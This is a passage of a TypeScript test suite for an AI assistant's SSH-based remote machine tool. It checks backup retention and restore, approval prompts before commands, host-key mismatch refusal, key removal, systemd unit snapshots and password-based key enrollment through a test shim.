      await expect(fleet.restore(machine, name)).rejects.toThrow(/not the name of a kept copy/);
      expect(await fleet.backupText(machine, name)).toBeNull();
    }
    await expect(fleet.restore(machine, "20200101T000000Z-abcdef")).rejects.toThrow(
      /no longer there/,
    );
  });

  it("keeps the twenty newest copies and lets the older go", async () => {
    const file = join(base, "files", "often-changed.txt");
    await writeFile(file, "version 0\n");
    // A fixed clock, a second apart, so "newest" has one meaning.
    const start = Date.UTC(2031, 0, 1, 0, 0, 0);
    const stamp = vi.spyOn(Fleet, "newBackupId");
    let tick = 0;
    stamp.mockImplementation(
      () =>
        `${new Date(start + (tick += 1) * 1000)
          .toISOString()
          .replace(/[-:]/g, "")
          .replace(/\.\d+Z$/, "Z")}-abc123`,
    );
    try {
      for (let version = 1; version <= 23; version += 1) {
        await fleet.writeFile(machine, file, `version ${version}\n`);
      }
    } finally {
      stamp.mockRestore();
    }
    const copies = (await fleet.backups(machine)).filter((copy) => copy.path === file);
    expect(copies.length).toBeLessThanOrEqual(20);
    // The newest is of the version just replaced; the first versions are gone.
    expect(await fleet.backupText(machine, copies[0]?.id ?? "")).toBe("version 22\n");
    const texts = await Promise.all(copies.map((copy) => fleet.backupText(machine, copy.id)));
    expect(texts).not.toContain("version 0\n");
  }, 60_000);

  it("changes nothing when a copy of the old file cannot be kept", async () => {
    const file = join(base, "files", "precious.conf");
    await writeFile(file, "as it was\n");
    const backups = join(base, "home", ".ai-chan-backups");
    const aside = `${backups}.aside`;
    // A plain file where the folder of copies should be: no copy can be made.
    await rename(backups, aside);
    await writeFile(backups, "in the way");
    try {
      await expect(fleet.writeFile(machine, file, "replaced\n")).rejects.toThrow(
        /could not be kept on that machine.*nothing was changed/,
      );
      expect(await readFile(file, "utf8")).toBe("as it was\n");
    } finally {
      await rm(backups, { force: true });
      await rename(aside, backups);
    }
  });

  it("works through the tool, marking what comes back as outside text", async () => {
    let outside = 0;
    const questions: RequestSummary[] = [];
    let steps = 0;
    const host: ToolHost = {
      policy: () => ({ workspace: join(base, "ws"), findMachine: (name) => fleet.find(name) }),
      memory: undefined as never,
      learnAddresses: () => undefined,
      noteOutsideText: () => (outside += 1),
      noteChange: () => undefined,
      signal: () => undefined,
      activity: () => undefined,
      ran: () => undefined,
      ask: (request) => {
        questions.push(request);
        return Promise.resolve(true);
      },
      step: () => (steps += 1),
    };
    const tool = createFleetTools(host, fleet)[TOOLS.remote] as unknown as {
      handler(input: unknown): Promise<string>;
    };
    expect(await tool.handler({ action: "list" })).toContain("- testbox:");
    // A status command on a machine she may look at: no question.
    expect(await tool.handler({ action: "run", machine: "testbox", command: "uptime" })).toContain(
      "Done on testbox.",
    );
    expect(questions).toHaveLength(0);
    expect(outside).toBe(1);
    const failed = await tool.handler({
      action: "run",
      machine: "testbox",
      command: "ls /definitely/not",
    });
    expect(failed).toMatch(/^Exit code 2 \(failed\) on testbox\./);
    expect(questions[0]?.title).toBe("Run this on testbox?");
    const fetched = await tool.handler({
      action: "fetch_file",
      machine: "testbox",
      path: join(base, "files", "sent"),
    });
    expect(fetched).toContain(join(base, "ws", "from-testbox", "sent"));
    expect(existsSync(join(base, "ws", "from-testbox", "sent"))).toBe(true);
    expect(await tool.handler({ action: "run", machine: "router", command: "uptime" })).toContain(
      "No machine is called",
    );
  });

  it("refuses to talk to a different machine answering at the same address", async () => {
    const known = join(base, "fleet", machine.id, "known_hosts");
    const real = await readFile(known, "utf8");
    await writeFile(
      known,
      `[127.0.0.1]:${machine.port} ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGb9ECWmEzf6FQbrBZ9w7lshQhqowtrbLDFw4rXAxZuE\n`,
    );
    const answer = await fleet.canSignIn(machine);
    expect(answer.ok).toBe(false);
    expect(answer.why).toContain("not the one whose fingerprint was confirmed");
    await writeFile(known, real);
  });

  it("takes only her own key off the machine when it is forgotten", async () => {
    expect(await fleet.forget(machine)).toEqual({ removedThere: true });
    expect(await readFile(keysFile, "utf8")).toBe("ssh-ed25519 AAAAsomeoneelse other@key\n");
    expect(existsSync(join(base, "fleet", machine.id))).toBe(false);
  });

  it("snapshots a systemd user unit file before systemctl --user restart and restores it", async () => {
    const home = join(base, "home");
    // Earlier 20-copy retention test uses synthetic 2031 timestamps; clear those first so 2026 snapshots aren't pruned as "oldest".
    await rm(join(home, ".ai-chan-backups"), { recursive: true, force: true });
    const unitDir = join(home, ".config", "systemd", "user");
    await mkdir(unitDir, { recursive: true, mode: 0o700 });
    const unitFile = join(unitDir, "demo-app.service");
    const originalUnit = "[Service]\nExecStart=/bin/true\n";
    await writeFile(unitFile, originalUnit, { mode: 0o644 });

    // Re-enroll key for this test (previous test removed it)
    const pubKey = await fleet.publicKey(machine.id);
    const hostKeys = await fleet.hostKeys(machine);
    await fleet.trust(machine.id, hostKeys);
    await writeFile(keysFile, `${pubKey}\n`, { mode: 0o600 });

    const snapId = await fleet.snapshotService(machine, "demo-app", true);
    expect(snapId).toMatch(BACKUP_ID);
    if (!snapId) throw new Error("Expected snapshot id");
    const listed = await fleet.backups(machine);
    expect(listed.some((b) => b.id === snapId && b.path === unitFile)).toBe(true);

    // Overwrite unit file then roll back via Fleet.restore
    await writeFile(unitFile, "[Service]\nExecStart=/bin/false\n", { mode: 0o644 });
    const undoSnap = await fleet.restore(machine, snapId);
    expect(undoSnap).toMatch(BACKUP_ID);
    expect(await readFile(unitFile, "utf8")).toBe(originalUnit);
  });

  it("renders a unified diff for send_file against a real local file", async () => {
    const remoteFile = join(base, "files", "diff-target.conf");
    const localFile = join(base, "local-new.conf");
    await writeFile(remoteFile, "port=80\nmode=safe\n", { mode: 0o644 });
    await writeFile(localFile, "port=443\nmode=safe\n", { mode: 0o644 });

    const verdict = await toolVerdict(
      TOOLS.remote,
      { action: "send_file", machine: "testbox", local: localFile, path: remoteFile },
      {
        workspace: base,
        home: base,
        findMachine: () => machine,
        remoteLook: {
          text: (_m, p) => fleet.readFile(machine, p),
          backups: (m) => fleet.backups(m),
          backupText: (m, id) => fleet.backupText(m, id),
        },
      },
    );
    expect(verdict.decision).toBe("ask");
    if (verdict.decision === "ask") {
      expect(verdict.summary?.detail).toContain("-port=80");
      expect(verdict.summary?.detail).toContain("+port=443");
    }
  });

  it("runs SSH_ASKPASS + REMOTE_SCRIPTS.letIn to enroll key and allow real sshd sign-in", async () => {
    const enrolledDir = await mkdtemp(join(tmpdir(), "aichan-askpass-"));
    try {
      const enrolledFleet = new Fleet({
        dir: join(enrolledDir, "fleet"),
        machines: () => [machine],
      });
      await writeFile(keysFile, "", { mode: 0o600 });
      const keys = await enrolledFleet.hostKeys(machine);
      await enrolledFleet.trust(machine.id, keys);
      expect((await enrolledFleet.canSignIn(machine)).ok).toBe(false);

      const askpass = join(enrolledDir, "askpass.sh");
      await writeFile(askpass, "#!/bin/sh\necho secret-pass\n", { mode: 0o700 });

      const binDir = join(enrolledDir, "bin");
      await mkdir(binDir, { mode: 0o700 });
      const fakeSsh = join(binDir, "ssh");
      await writeFile(
        fakeSsh,
        `#!/bin/sh
set -e
[ "$SSH_ASKPASS_REQUIRE" = "force" ]
pw=$("$SSH_ASKPASS" "Password")
[ "$pw" = "secret-pass" ]
case "$*" in
  *"BatchMode=no"*"PubkeyAuthentication=no"*"NumberOfPasswordPrompts=1"*) ;;
  *) exit 2 ;;
esac
shift $(( $# - 1 ))
HOME="${join(base, "home")}" exec sh -c "$1"
`,
        { mode: 0o700 },
      );

      const shimmedFleet = new Fleet({
        dir: join(enrolledDir, "fleet"),
        machines: () => [machine],
        programs: { ssh: fakeSsh },
      });
      await shimmedFleet.installKeyWithPassword(machine, askpass);

      // Real /usr/bin/ssh against real sshd now succeeds without password
      expect(await enrolledFleet.canSignIn(machine)).toEqual({ ok: true, why: "" });
    } finally {
      await rm(enrolledDir, { recursive: true, force: true });
    }
  });
});
